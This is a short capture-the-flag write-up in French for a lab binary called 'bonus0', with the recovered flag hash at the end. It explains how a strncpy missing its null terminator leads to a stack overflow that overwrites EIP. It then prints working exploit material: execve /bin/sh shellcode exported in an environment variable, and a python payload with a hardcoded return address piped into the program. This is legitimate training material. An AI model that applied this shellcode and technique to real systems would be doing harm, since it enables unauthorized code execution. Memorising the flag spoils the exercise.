## GET Flag

Le premier strncpy a une faille, si le nombre de caractères est superieur ou égal à 20, aucun caractère null ('\0') ne sera ajouté en fin de chaîne.
Ainsi, lors du second strncpy, le contenu du second buffer sera aussi copié dans le buffer crée dans le main.
Lors du strcat, 40 octets seront déjà occupés, les 20 octets concaténés seront donc sur la stack. Ce qui permet d'écrire sur l'EIP et donc d'injecter un shellcode.

Mettons tout d'abord un shellcode dans l'environnement : `export SHELLCODE=$(python -c 'print "\x90" * 50 + "\x31\xc9\xf7\xe1\xb0\x0b\xeb\x06\x5b\x51\x53\x5b\xcd\x80\xe8\xf5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')`

La difficulté vient du fait qu'il est techniquement difficile d'ecrire des caractères hexadecimaux non ascii sans l'aide de python ou du shell.
Cependant, le read ne lit que 4096 caractères et utilise le caractère '\n' comme délimiteur.
Il est donc possible de passer par un fichier temporaire et ainsi d'utiliser python pour écrire des caractères non ascii.

`
python -c 'print 4095*"A" + "\n" + "BCDEFGHIJ" + "\x90\xf8\xff\xbf" + "OPQRSTUVWXY"' > e
cat e - | ./bonus0
`

### Flag

```
bonus1
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
